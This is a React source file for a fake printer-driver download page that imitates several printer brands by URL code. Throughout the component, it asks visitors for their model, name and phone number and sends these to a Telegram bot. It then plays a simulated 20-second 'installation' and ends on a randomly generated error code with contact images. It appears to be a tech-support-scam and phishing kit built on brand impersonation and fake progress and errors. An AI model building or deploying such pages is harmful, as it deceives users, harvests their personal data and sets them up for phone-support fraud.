import React, { useState, useEffect } from 'react';

interface BrandTheme {
  shortWord: string;
  logoImg: string;
  primaryBg: string;
  buttonBg: string;
  buttonHover: string;
  navItems: string[];
  heroPrinterImg: string;
  heroBgImg: string;
  modelFinderImg: string;
  footerImg: string;
}

const brandConfigs: Record<string, BrandTheme> = {
  br: {
    shortWord: 'BR',
    logoImg: '/images/B-Logo.png',
    primaryBg: 'bg-[#003399]',
    buttonBg: 'bg-[#E53E3E]',
    buttonHover: 'hover:bg-[#C53030]',
    navItems: ['Mono Laser', 'Color Laser', 'Inkjet', 'Label Printers', 'Supplies', 'Support & Downloads'],
    heroPrinterImg: '/images/B-Hero.png',
    heroBgImg: '/images/B-Hero-Bg.jpg',
    modelFinderImg: '/images/B-Model.png',
    footerImg: '/images/B-Footer.jpg',
  },
  h: {
    shortWord: 'H',
    logoImg: '/images/H-Logo.svg',
    primaryBg: 'bg-[#0096D6]',
    buttonBg: 'bg-[#222222]',
    buttonHover: 'hover:bg-[#444444]',
    navItems: ['LaserJet', 'OfficeJet', 'Envy', 'DesignJet', 'Supplies', 'Support'],
    heroPrinterImg: '/images/H-Hero.png',
    heroBgImg: '/images/H-Hero-Bg.jpg',
    modelFinderImg: '/images/H-Model.png',
    footerImg: '/images/H-Footer.jpg',
  },
  ca: {
    shortWord: 'CA',
    logoImg: '/images/C-Logo.png',
    primaryBg: 'bg-[#C30010]',
    buttonBg: 'bg-[#0091FF]',
    buttonHover: 'hover:bg-[#0077E2]',
    navItems: ['Maxify', 'Laser', 'Selphy', 'Supplies', 'Projectors', 'Label Printer', 'ink'],
    heroPrinterImg: '/images/C-Hero.png',
    heroBgImg: '/images/C-Hero-Bg.jpg',
    modelFinderImg: '/images/C-Model.png',
    footerImg: '/images/C-Footer.png',
  },
  ep: {
    shortWord: 'EP',
    logoImg: '/images/E-Logo.png',
    primaryBg: 'bg-[#0054A6]',
    buttonBg: 'bg-[#0085FF]',
    buttonHover: 'hover:bg-[#006ACC]',
    navItems: ['EcoTank', 'WorkForce', 'Expression', 'Supplies', 'Projectors', 'Scanners'],
    heroPrinterImg: '/images/E-Hero.png',
    heroBgImg: '/images/E-Hero-Bg.jpg',
    modelFinderImg: '/images/E-Model.png',
    footerImg: '/images/E-Footer.jpg',
  }
};

// ─── TELEGRAM CONFIGURATION ───
const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';

// ─── RANDOM INSTALLING MESSAGES ───
const installingMessages = [
  "Installing drivers, please wait... Don't close the page.",
  "Configuring printer settings... Please keep this window open.",
  "Downloading necessary files... Do not close the browser.",
  "Setting up connection... Please wait patiently.",
  "Finalizing installation... Don't navigate away from this page."
];

const generateErrorCode = () => `ERR-${Math.floor(1000 + Math.random() * 9000)}-PRINTER`;

type ModalStep = 'select' | 'details' | 'installing' | 'error';

export default function GuideBrand() {
  const [detectedBrand, setDetectedBrand] = useState<string>('ca');
  const [modelNumber, setModelNumber] = useState('');
  
  // Modal Workflow States
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [modalStep, setModalStep] = useState<ModalStep>('select');
  const [connectionType, setConnectionType] = useState<'USB' | 'WIFI' | null>(null);

  // User Details
  const [userName, setUserName] = useState('');
  const [userPhone, setUserPhone] = useState('');
  const [tempModel, setTempModel] = useState('');

  // Status States
  const [installingMsg, setInstallingMsg] = useState('');
  const [installProgress, setInstallProgress] = useState(0);
  const [errorCode, setErrorCode] = useState('');
  const [supportNumber] = useState('+1 (800) 555-0199');

  useEffect(() => {
    if (typeof window !== 'undefined') {
      const segments = window.location.pathname.split('/');
      const code = segments[segments.length - 1] || segments[2];
      
      if (code && brandConfigs[code.toLowerCase()]) {
        setDetectedBrand(code.toLowerCase());
      }
    }
  }, []);

  const currentBrand = brandConfigs[detectedBrand];

  const handleSubmitForm = (e: React.FormEvent) => {
    e.preventDefault();
    setModalStep('select');
    setIsModalOpen(true);
  };

  const handleSelectConnection = (type: 'USB' | 'WIFI') => {
    setConnectionType(type);
    setModalStep('details');
  };

  const handleSubmitDetails = async (e: React.FormEvent) => {
    e.preventDefault();
    
    const finalModel = modelNumber || tempModel;
    
    // Build Telegram message
    const message = `
🖨️ <b>New Printer Driver Request</b>

🏷️ <b>Brand:</b> ${currentBrand.shortWord}
🔢 <b>Model:</b> ${finalModel || 'Not provided'}
🔗 <b>Connection:</b> ${connectionType}
👤 <b>Name:</b> ${userName}
📞 <b>Phone:</b> ${userPhone}
    `.trim();

    // Send to Telegram Bot
    if (TELEGRAM_BOT_TOKEN !== 'YOUR_BOT_TOKEN_HERE' && TELEGRAM_CHAT_ID !== 'YOUR_CHAT_ID_HERE') {
      try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'HTML'
          })
        });
      } catch (err) {
        console.error('Telegram send failed:', err);
      }
    } else {
      console.log('Telegram not configured. Message payload:', message);
    }
    
    // Show installing step
    const randomMsg = installingMessages[Math.floor(Math.random() * installingMessages.length)];
    setInstallingMsg(randomMsg);
    setInstallProgress(0);
    setModalStep('installing');
    
    // Realistic progress bar animation over 20 seconds
    const duration = 20000;
    const interval = 200;
    const steps = duration / interval;
    let currentStep = 0;
    
    const progressTimer = setInterval(() => {
      currentStep++;
      // Non-linear progress for realism (slow at start, fast in middle, slow at end)
      const progress = Math.min(100, Math.floor((currentStep / steps) * 100));
      setInstallProgress(progress);
      
      if (currentStep >= steps) {
        clearInterval(progressTimer);
      }
    }, interval);
    
    // After 20 seconds → Error
    setTimeout(() => {
      setErrorCode(generateErrorCode());
      setModalStep('error');
    }, duration);
  };

  const closeModal = () => {
    setIsModalOpen(false);
    setConnectionType(null);
    setModalStep('select');
    setUserName('');
    setUserPhone('');
    setTempModel('');
    setInstallingMsg('');
    setInstallProgress(0);
    setErrorCode('');
  };

  return (
    <div className="min-h-screen bg-white font-sans text-gray-800 antialiased relative">
      
      {/* --- NAVBAR --- */}
      <header className="border-b border-gray-200 px-6 py-4 md:px-12 bg-white relative z-20">
        <div className="max-w-7xl mx-auto flex items-center justify-between gap-4">
          <div className="h-10 flex items-center">
            <img 
              src={currentBrand.logoImg} 
              alt={`${currentBrand.shortWord} Logo`} 
              className="max-h-full max-w-[140px] object-contain"
            />
          </div>
          <nav className="hidden lg:flex items-center gap-6 text-sm font-bold text-gray-600">
            {currentBrand.navItems.map((item, index) => (
              <span key={index} className="hover:text-black cursor-pointer transition capitalize">
                {item}
              </span>
            ))}
          </nav>
        </div>
      </header>

      {/* --- HERO SECTION WITH DYNAMIC BACKGROUND --- */}
      <section className={`${currentBrand.primaryBg} text-white px-6 py-12 md:px-12 md:py-20 relative overflow-hidden transition-colors duration-300`}>
        {/* Dynamic Background Image */}
        <div 
          className="absolute inset-0 bg-cover bg-center bg-no-repeat opacity-20 z-0"
          style={{ backgroundImage: `url(${currentBrand.heroBgImg})` }}
        />
        <div className="absolute inset-0 bg-black opacity-10 z-0" />
        
        <div className="max-w-7xl mx-auto grid md:grid-cols-2 items-center gap-8 relative z-10">
          <div className="space-y-6">
            <h1 className="text-3xl md:text-5xl font-extrabold tracking-tight leading-tight">
              Download Free Printer Drivers
            </h1>
            <ul className="space-y-3 text-base md:text-lg opacity-95 list-disc list-inside font-medium">
              <li>Make sure your printer is powered on</li>
              <li>Click on Download to install the drivers</li>
            </ul>
            <button 
              onClick={() => setIsModalOpen(true)}
              className={`${currentBrand.buttonBg} ${currentBrand.buttonHover} text-white text-lg px-8 py-4 rounded-full font-bold inline-flex items-center gap-3 shadow-lg transition-all transform hover:scale-[1.03] active:scale-95`}
            >
              Download Now <span className="text-xl">➔</span>
            </button>
          </div>
          <div className="flex justify-center md:justify-end">
            {/* HERO IMAGE: Made smaller */}
            <img 
              src={currentBrand.heroPrinterImg} 
              alt={`${currentBrand.shortWord} Device`} 
              className="max-h-48 md:max-h-64 object-contain rounded-lg drop-shadow-2xl"
            />
          </div>
        </div>
      </section>

      {/* --- FORM & DIAGRAM INSTRUCTIONAL SECTION --- */}
      <section className="px-6 py-12 md:px-12 bg-gray-50">
        <div className="max-w-7xl mx-auto grid md:grid-cols-2 gap-10 items-start">
          
          {/* Left Input Form Block */}
          <div className="bg-white p-6 md:p-8 rounded-xl shadow-sm border border-gray-200 space-y-4">
            <h2 className="text-2xl font-bold text-gray-900">
              Quick Download Free Drivers
            </h2>
            <p className="text-sm text-gray-600 font-medium">
              Fill the form below and download your printer driver setup immediately.
            </p>
            
            <form onSubmit={handleSubmitForm} className="space-y-4">
              <div className="space-y-1.5">
                <label className="block text-sm font-bold text-gray-900">
                  Enter Model Number:
                </label>
                <input 
                  type="text" 
                  value={modelNumber}
                  onChange={(e) => setModelNumber(e.target.value)}
                  placeholder="e.g. XP-4200, MF240"
                  className="w-full px-4 py-3 border border-gray-300 rounded-lg text-base text-gray-900 font-bold bg-white focus:outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-100 placeholder-gray-400"
                  required
                />
              </div>
              <button 
                type="submit" 
                className="w-full bg-[#0091FF] hover:bg-[#007EE6] text-white text-sm font-bold py-3.5 px-4 rounded-lg shadow-sm transition-colors"
              >
                Quick Download & Install Drivers! 📥
              </button>
            </form>
          </div>

          {/* Right Reference Instructional Block */}
          <div className="space-y-4 bg-white p-6 md:p-8 rounded-xl shadow-sm border border-gray-200">
            <h3 className="text-2xl font-bold text-gray-900">
              How to find printer model number?
            </h3>
            <p className="text-sm text-gray-600 font-medium">
              The product name label is visible prominently on the front or top layout of your device.
            </p>
            <div className="w-full flex justify-center pt-2">
              <img 
                src={currentBrand.modelFinderImg} 
                alt="Printer identity layout diagram" 
                className="w-full max-w-sm h-auto object-contain rounded-lg border border-gray-100 shadow-inner"
              />
            </div>
          </div>

        </div>
      </section>

      {/* --- EDGE TO EDGE FULL-WIDTH IMAGE FOOTER --- */}
      <footer className="w-full border-t border-gray-200 bg-white overflow-hidden">
        <img 
          src={currentBrand.footerImg} 
          alt={`${currentBrand.shortWord} Corporate Footer Profile Reference`} 
          className="w-full h-auto object-cover block"
        />
      </footer>

      {/* --- SETUP WORKFLOW MODAL --- */}
      {isModalOpen && (
        <div className="fixed inset-0 bg-black bg-opacity-60 flex items-center justify-center z-50 p-4 animate-fadeIn backdrop-blur-sm">
          <div className="bg-white rounded-2xl shadow-2xl max-w-lg w-full overflow-hidden border border-gray-100 relative">
            
            {/* Header */}
            <div className="px-6 py-5 border-b border-gray-200 flex items-center justify-between bg-gray-50">
              <h3 className="text-xl font-bold text-gray-900">Quick Download Free Drivers</h3>
              <button
                type="button"
                onClick={closeModal}
                className="text-gray-500 hover:text-gray-900 transition"
                aria-label="Close modal"
              >
                ✕
              </button>
            </div>

            {/* Step Content */}
            <div className="p-6 md:p-8 min-h-[420px] flex flex-col justify-between">
              
              {/* STEP 1: CONNECTION SELECTION */}
              {modalStep === 'select' && (
                <div className="space-y-6 animate-fadeIn">
                  <p className="text-base font-semibold text-gray-700">
                    Select your connection type {modelNumber && `for ${currentBrand.shortWord} ${modelNumber}`}:
                  </p>
                  
                  <div className="space-y-4">
                    {/* USB Option */}
                    <div className="flex items-center justify-between border-2 border-gray-200 rounded-xl p-4 bg-white hover:border-blue-400 hover:bg-blue-50 transition cursor-pointer group">
                      <div className="flex items-center gap-4">
                        <img src="/images/USB.jpg" alt="USB Connection" className="w-32 h-28 object-contain rounded-lg" />
                        <div>
                          <p className="text-xl font-bold text-gray-900 group-hover:text-blue-700 transition">USB Connection</p>
                          <p className="text-sm text-gray-500 font-medium mt-1">Connect via USB cable</p>
                        </div>
                      </div>
                      <button 
                        onClick={() => handleSelectConnection('USB')}
                        className="bg-blue-600 hover:bg-blue-700 text-white text-sm font-bold py-3 px-5 rounded-lg transition shadow-sm"
                      >
                        Start →
                      </button>
                    </div>

                    {/* Wi-Fi Option */}
                    <div className="flex items-center justify-between border-2 border-gray-200 rounded-xl p-4 bg-white hover:border-blue-400 hover:bg-blue-50 transition cursor-pointer group">
                      <div className="flex items-center gap-4">
                        <img src="/images/WIFI.png" alt="Wi-Fi Connection" className="w-32 h-28 object-contain rounded-lg" />
                        <div>
                          <p className="text-xl font-bold text-gray-900 group-hover:text-blue-700 transition">WIFI Connection</p>
                          <p className="text-sm text-gray-500 font-medium mt-1">Connect via Wireless Network</p>
                        </div>
                      </div>
                      <button 
                        onClick={() => handleSelectConnection('WIFI')}
                        className="bg-blue-600 hover:bg-blue-700 text-white text-sm font-bold py-3 px-5 rounded-lg transition shadow-sm"
                      >
                        Start →
                      </button>
                    </div>
                  </div>
                </div>
              )}

              {/* STEP 2: USER DETAILS FORM */}
              {modalStep === 'details' && (
                <form onSubmit={handleSubmitDetails} className="space-y-5 animate-fadeIn">
                  <p className="text-base font-semibold text-gray-700">
                    Please enter your details for {connectionType} setup:
                  </p>
                  
                  {!modelNumber && (
                    <div className="space-y-1.5">
                      <label className="block text-sm font-bold text-gray-900">Printer Model Number</label>
                      <input 
                        type="text" 
                        value={tempModel}
                        onChange={(e) => setTempModel(e.target.value)}
                        placeholder="e.g. XP-4200, MF240"
                        className="w-full px-4 py-3 border border-gray-300 rounded-lg text-base text-gray-900 font-bold bg-white focus:outline-none focus:border-blue-500 focus:ring-2 focus:ring-blue-100 placeholder-gray-400"
                        required
                      />
                    </div>
                  )}
                  
                  <div className="space-y-1.5">
                    <label className="block text-sm font-bold text-gray-900">Your Name</label>
                    <input 
                      type="text" 
                      value={userName}
                      onChange={(e) => setUserName(e.target.value)}
                      placeholder="Enter your full name"
                      className="w-full px-4 py-3 border border-gray-300 rounded-lg text-base text-gray-900 font-bold bg-white focus:outline-none focus:border-blue-500 focus:ring-2 focus:ring-blue-100 placeholder-gray-400"
                      required
                    />
                  </div>
                  
                  <div className="space-y-1.5">
                    <label className="block text-sm font-bold text-gray-900">Phone Number</label>
                    <input 
                      type="tel" 
                      value={userPhone}
                      onChange={(e) => setUserPhone(e.target.value)}
                      placeholder="e.g. +1 234 567 8900"
                      className="w-full px-4 py-3 border border-gray-300 rounded-lg text-base text-gray-900 font-bold bg-white focus:outline-none focus:border-blue-500 focus:ring-2 focus:ring-blue-100 placeholder-gray-400"
                      required
                    />
                  </div>
                  
                  <button 
                    type="submit" 
                    className="w-full bg-blue-600 hover:bg-blue-700 text-white text-base font-bold py-3.5 px-4 rounded-lg shadow-md transition-colors"
                  >
                    Submit & Continue
                  </button>
                </form>
              )}

              {/* STEP 3: INSTALLING (20 SECONDS) */}
              {modalStep === 'installing' && (
                <div className="flex flex-col items-center justify-center space-y-6 my-auto text-center animate-fadeIn">
                  {/* Installing Image */}
                  <img 
                    src="/images/USB.jpg" 
                    className="w-50 object-contain animate-pulse"
                  />
                  
                  <div className="space-y-2 max-w-sm">
                    <p className="text-xl font-bold text-gray-800 leading-snug">{installingMsg}</p>
                    <p className="text-xs text-gray-500 font-medium">Please do not close your browser during this process</p>
                  </div>
                  
                  {/* Professional Realistic Progress Bar */}
                  <div className="w-full max-w-sm space-y-2">
                    <div className="flex justify-between text-xs font-bold text-gray-500 uppercase tracking-wider">
                      <span>Installing</span>
                      <span>{installProgress}%</span>
                    </div>
                    <div className="w-full bg-gray-200 rounded-full h-4 overflow-hidden border border-gray-300 shadow-inner">
                      <div 
                        className="bg-gradient-to-r from-blue-500 to-blue-600 h-4 rounded-full transition-all duration-200 ease-linear relative"
                        style={{ width: `${installProgress}%` }}
                      >
                        {/* Shine effect */}
                        <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white to-transparent opacity-20 animate-pulse"></div>
                        {/* Striped pattern overlay */}
                        <div className="absolute inset-0 opacity-10" style={{
                          backgroundImage: 'repeating-linear-gradient(45deg, transparent, transparent 10px, #000 10px, #000 20px)'
                        }}></div>
                      </div>
                    </div>
                    <div className="flex justify-between text-[10px] text-gray-400 font-medium">
                      <span>Extracting files...</span>
                      <span>Configuring system...</span>
                    </div>
                  </div>
                </div>
              )}

              {modalStep === 'error' && (
  <div className="flex flex-col justify-center items-center space-y-3 sm:space-y-4 my-auto text-center animate-fadeIn max-h-[85vh] w-full px-2 overflow-hidden">
    {/* Error Image - Scales fluidly with the viewport height */}
    <div className="flex justify-center w-full">
      <img 
        src="/images/E-Message.png" 
        className="w-auto h-[8vh] max-h-36 min-h-[80px] object-contain"
      />
    </div>
    
    {/* Main Text & Error Code */}
    <div className="flex flex-col items-center justify-center space-y-2 w-full">
      <img 
        src="/images/S1.png" 
        className="mx-auto h-[14vh] max-h-24 min-h-[120px] object-contain" 
      />
      <div className="inline-block bg-red-50 border-2 border-red-200 rounded-xl px-5 py-2 sm:px-6 sm:py-3">
        <p className="text-[10px] sm:text-xs text-gray-500 uppercase tracking-wider font-bold mb-0.5">Error Code</p>
        <p className="text-xl sm:text-2xl font-mono font-bold text-red-600">{errorCode}</p>
      </div>
    </div>
   
    {/* Contact Image (S2) - Significantly increased size relative to screen */}
    <div className="flex justify-center w-full">
     <img 
        src="/images/S2.png" 
        className="w-auto h-[26vh] max-h-60 min-h-[150px] object-contain"
      />
    </div>
  </div>
)}
             

            </div>
          </div>
        </div>
      )}

    </div>
  );
}